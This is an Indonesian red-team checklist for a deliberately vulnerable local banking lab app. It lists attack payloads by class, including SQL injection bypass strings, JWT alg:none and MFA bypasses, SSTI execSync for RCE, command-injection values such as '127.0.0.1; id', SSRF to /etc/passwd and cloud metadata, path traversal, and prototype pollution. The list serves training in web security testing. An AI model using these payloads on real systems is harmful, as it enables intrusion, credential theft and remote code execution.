# Checklist Lab — Bank UBS

Gunakan checklist ini saat menjalankan sesi red team. Tandai `[x]` setelah
setiap item terbukti. Semua endpoint mengasumsikan `BASE=http://127.0.0.1:3001`.

---

## A. Persiapan

- [ ] `npm install`
- [ ] `npm run lab:reset`
- [ ] `curl -s $BASE/api/health` → `profile: extreme`
- [ ] Buka `http://127.0.0.1:3001` di browser
- [ ] Login `budi` / `budi123`
- [ ] Catat timestamp mulai sesi
- [ ] Siapkan Wireshark / mitmproxy
- [ ] Siapkan folder evidence di luar repo (atau gunakan `lab/evidence`)

---

## B. Recon

- [ ] `GET /api/docs` — daftar endpoint
- [ ] `GET /api/config` — secret bocor
- [ ] `GET /api/health` — path DB, platform
- [ ] `GET /robots.txt` — path admin/backup/internal
- [ ] `GET /api/debug` — hint Wireshark
- [ ] Lihat source `index.html` — komentar akun demo
- [ ] `GET /backup/database.sqlite` — backup publik
- [ ] `GET /backup/app.log` — log publik
- [ ] `GET /api/admin/logs` — log tanpa auth
- [ ] `GET /api/admin/export` — CSV password
- [ ] `GET /api/admin/users` — user + password tanpa auth
- [ ] `GET /api/admin/backup` — backup via API

---

## C. SQL Injection

- [ ] Login bypass `admin'--`
- [ ] UNION search `%' UNION SELECT ...`
- [ ] User detail `/api/users/3` (IDOR + SQLi)
- [ ] Statement `/api/users/3/statement`
- [ ] Notes insert exfiltrasi password
- [ ] Support search UNION
- [ ] Reset password `admin'--`
- [ ] Error verbose `/api/users/abc`
- [ ] Transfer/withdraw SQLi (numeric)
- [ ] Simpan query + response sebagai evidence

---

## D. Autentikasi dan Session

- [ ] `X-User-Id: 3` → admin
- [ ] JWT `alg:none` → admin
- [ ] MFA `000000`
- [ ] MFA `{"bypass":true}`
- [ ] Session fixation `?sid=`
- [ ] Logout lalu reuse cookie
- [ ] Cookie tanpa `HttpOnly`
- [ ] Cookie tanpa `Secure`
- [ ] Register dengan `role:admin`
- [ ] Update profil `role/saldo`
- [ ] Login tanpa rate limit (10x salah)
- [ ] Tidak ada lockout

---

## E. XSS

- [ ] Reflected XSS login error
- [ ] Stored XSS notes
- [ ] Stored XSS support subject
- [ ] Stored XSS support message
- [ ] Stored XSS bio
- [ ] DOM XSS `#<img ...>`
- [ ] Log injection → admin log viewer
- [ ] Upload HTML → `/uploads/...`
- [ ] Upload SVG dengan script
- [ ] Curi `document.cookie` via XSS
- [ ] CSV formula injection

---

## F. IDOR

- [ ] `/api/notes` semua user
- [ ] `/api/users/3`
- [ ] `/api/users/3/statement`
- [ ] `/api/support/tickets`
- [ ] `/api/files`
- [ ] `/api/files/1`
- [ ] `/api/transfers?user_id=2`
- [ ] `/api/withdraw` dengan `user_id` lain
- [ ] `/api/statement/export.csv?user_id=2`

---

## G. SSRF

- [ ] Fetch `http://127.0.0.1:3001/api/internal/users`
- [ ] Fetch `http://127.0.0.1:3001/api/config`
- [ ] Fetch `file:///etc/passwd` (Linux)
- [ ] Fetch `file:///D:/.../package.json` (Windows)
- [ ] Fetch cloud metadata `169.254.169.254`
- [ ] Spoof `X-Forwarded-For: 127.0.0.1` ke `/api/internal/users`
- [ ] Dapatkan `internal_api_key`

---

## H. XXE (extreme)

- [ ] XML dengan `<!ENTITY ... SYSTEM "file:///...">`
- [ ] Baca `/etc/passwd` atau `package.json`
- [ ] Entity HTTP ke `/api/config`
- [ ] Response `expanded` berisi data
- [ ] Coba blind/OOB ke listener lab

---

## I. SSTI (extreme)

- [ ] Render `<%= 7 * 7 %>` → `49`
- [ ] Render `<%= process.version %>`
- [ ] Render `<%= require('child_process').execSync('whoami').toString() %>`
- [ ] Dapatkan RCE
- [ ] Simpan output sebagai evidence

---

## J. Command Injection (extreme)

- [ ] Dapatkan role admin (SQLi/X-User-Id/mass assignment)
- [ ] `POST /api/admin/diagnostics/ping`
- [ ] Windows: `{"host":"127.0.0.1 & whoami"}`
- [ ] Linux: `{"host":"127.0.0.1; id"}`
- [ ] Output command terlihat di response
- [ ] Coba command read-only (`whoami`, `hostname`, `pwd`)

---

## K. Upload dan File

- [ ] Upload `.html` tanpa validasi
- [ ] Upload `.svg` dengan script
- [ ] Upload nama `../../evil` (dicegah basename)
- [ ] Download `../database.sqlite`
- [ ] Download `../server.js`
- [ ] Download `../.env` (jika ada)
- [ ] File HTML dieksekusi same-origin

---

## L. Business Logic

- [ ] Transfer negatif menambah saldo
- [ ] Fee negatif
- [ ] Withdraw race (10 paralel)
- [ ] Replay kupon `HEMAT50`
- [ ] Bayar tagihan amount 1
- [ ] Saldo negatif
- [ ] Transfer tanpa auth (GET)
- [ ] Transfer dari `from_id` user lain

---

## M. Prototype Pollution

- [ ] Kirim raw JSON `{"preferences":{"__proto__":{"isAdmin":true}}}`
- [ ] Response `prototype_isAdmin:true`
- [ ] Akses endpoint admin dengan user biasa
- [ ] Ubah role user
- [ ] Restart/reset untuk membersihkan pollution

---

## N. Web Security Lain

- [ ] CORS reflect origin + credentials
- [ ] CSRF GET transfer
- [ ] CSRF form POST
- [ ] Open redirect `/api/auth/redirect`
- [ ] Open redirect login `?next=`
- [ ] Clickjacking iframe `/admin`
- [ ] Tidak ada CSP
- [ ] Tidak ada `X-Frame-Options`
- [ ] Tidak ada HSTS
- [ ] Tidak ada redirect HTTPS
- [ ] Cookie tanpa `Secure`

---

## O. HTTP/MITM

- [ ] Capture `POST /api/auth/login`
- [ ] Lihat username/password plaintext
- [ ] Lihat `Set-Cookie: sid=...`
- [ ] Lihat cookie pada request berikutnya
- [ ] Follow HTTP stream
- [ ] Basic auth `/api/auth/legacy` (base64)
- [ ] Replay cookie di curl
- [ ] Session hijack berhasil
- [ ] CSRF dari origin lain
- [ ] Simpan PCAP + screenshot

---

## P. Rantai Serangan

- [ ] Chain A: SQLi → admin → command injection → RCE
- [ ] Chain B: MITM → session hijack → CSRF
- [ ] Chain C: Stored XSS → admin cookie → SSTI/RCE
- [ ] Chain D: IDOR → backup DB → password plaintext
- [ ] Chain E: Prototype pollution → admin → RCE
- [ ] Chain F: SSRF → internal API → secret
- [ ] Chain G: Business logic → saldo inflation

---

## Q. Evidence

- [ ] Simpan request/response HTTP (curl output)
- [ ] Simpan PCAP Wireshark
- [ ] Simpan screenshot UI
- [ ] Simpan output command/SSTI
- [ ] Simpan DB/CSV hasil IDOR
- [ ] Catat timestamp dan endpoint
- [ ] Jangan simpan data pribadi nyata

---

## R. Reset

- [ ] `npm run lab:status`
- [ ] `npm run lab:reset`
- [ ] Cek backup di `lab/evidence/<timestamp>/`
- [ ] Cek `counts.json`
- [ ] Cek server autostart
- [ ] Login `budi` → saldo kembali Rp 5.000.000
- [ ] Notes kembali 4
- [ ] Tiket kembali 3
- [ ] Upload kembali 4 file sample
- [ ] Log baru bersih
- [ ] Session lama tidak valid (DB baru)

---

## S. Jika RCE Sudah di Host

- [ ] Catat command yang dijalankan
- [ ] `npm run lab:stop`
- [ ] Commit/simpan pekerjaan yang diperlukan
- [ ] `npm run lab:reset -- --hard --yes` **atau** `npm run lab:docker:reset`
- [ ] Verifikasi tidak ada proses/file aneh
- [ ] Ganti secret lab jika host dipakai bersama
- [ ] Dokumentasikan temuan

---

## Skor Cepat

| Kategori | Target |
|----------|--------|
| Recon | 10 item |
| SQLi | 8 item |
| Auth | 10 item |
| XSS | 10 item |
| IDOR | 8 item |
| SSRF/XXE/SSTI/RCE | 10 item |
| Business logic | 8 item |
| Web/MITM | 12 item |

Total item bervariasi; fokus pada bukti, bukan jumlah.
